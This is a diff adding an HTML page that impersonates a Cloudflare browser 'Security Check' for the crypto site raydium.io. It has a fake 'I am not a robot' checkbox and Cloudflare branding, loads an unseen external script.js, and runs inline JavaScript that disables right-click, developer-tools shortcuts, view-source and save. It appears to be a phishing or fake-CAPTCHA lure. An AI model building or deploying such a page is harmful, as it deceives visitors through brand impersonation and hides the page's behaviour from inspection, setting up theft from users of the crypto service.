@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check - Cloudflare</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI2LjY2NjcgMTZDMjYuNjY2NyAyMi4yNjY3IDIxLjYgMjcuMzMzMyAxNS4zMzMzIDI3LjMzMzNDOS4wNjY2NyAyNy4zMzMzIDQgMjIuMjY2NyA0IDE2QzQgOS43MzMzMyA5LjA2NjY3IDQuNjY2NjcgMTUuMzMzMyA0LjY2NjY3QzIxLjYgNC42NjY2NyAyNi42NjY3IDkuNzMzMzMgMjYuNjY2NyAxNloiIGZpbGw9IiNGNDhDMDYiLz4KPC9zdmc+">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M26.6667 16C26.6667 22.2667 21.6 27.3333 15.3333 27.3333C9.06667 27.3333 4 22.2667 4 16C4 9.73333 9.06667 4.66667 15.3333 4.66667C21.6 4.66667 26.6667 9.73333 26.6667 16Z" fill="#F48C06"/>
+                </svg>
+                <span>Verify</span>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="security-check">
+                <div class="icon-container">
+                    <div class="security-icon">
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="#F48C06" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M9 12L11 14L15 10" stroke="#F48C06" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <h1>Security Check</h1>
+                <p class="description">
+    We are checking your browser before granting access to 
+    <span style="font-weight: bold; color: black; font-size: 1.1em;">raydium.io</span>.
+    This may take a few seconds.
+</p>
+
+                <div class="verification-box">
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="botCheck" class="custom-checkbox">
+                        <label for="botCheck" class="checkbox-label">
+                            <span class="checkmark"></span>
+                            I am not a robot
+                        </label>
+                    </div>
+                    <div class="loading-spinner" id="loadingSpinner" style="display: none;">
+                        <div class="spinner"></div>
+                    </div>
+                </div>
+
+                <div class="info-text">
+                    <p>This process is automatic. Your browser will be redirected to your requested content shortly.</p>
+                    <p>Please wait up to 5 seconds...</p>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>Products</h4>
+                    <ul>
+                        <li><a href="#">CDN</a></li>
+                        <li><a href="#">DNS</a></li>
+                        <li><a href="#">DDoS Protection</a></li>
+                        <li><a href="#">SSL/TLS</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Solutions</h4>
+                    <ul>
+                        <li><a href="#">For Developers</a></li>
+                        <li><a href="#">For Enterprises</a></li>
+                        <li><a href="#">Security</a></li>
+                        <li><a href="#">Performance</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Resources</h4>
+                    <ul>
+                        <li><a href="#">Documentation</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Community</a></li>
+                        <li><a href="#">Support</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Company</h4>
+                    <ul>
+                        <li><a href="#">About Us</a></li>
+                        <li><a href="#">Careers</a></li>
+                        <li><a href="#">Press Center</a></li>
+                        <li><a href="#">Investors</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="footer-links">
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Terms of Use</a>
+                    <a href="#">Cookie Policy</a>
+                </div>
+                <div class="footer-copyright">
+                    <p>&copy; 2025 Cloudflare, Inc. All Rights Reserved.</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+    
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    
+    document.addEventListener('keydown', function(e) {
+        // F12
+        if (e.key === "F12") {
+            e.preventDefault();
+        }
+
+        // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+        if ((e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || 
+            (e.ctrlKey && (e.key === 'U' || e.key === 'S'))) {
+            e.preventDefault();
+        }
+    });
+</script>
+</body>
+
+</html>
+
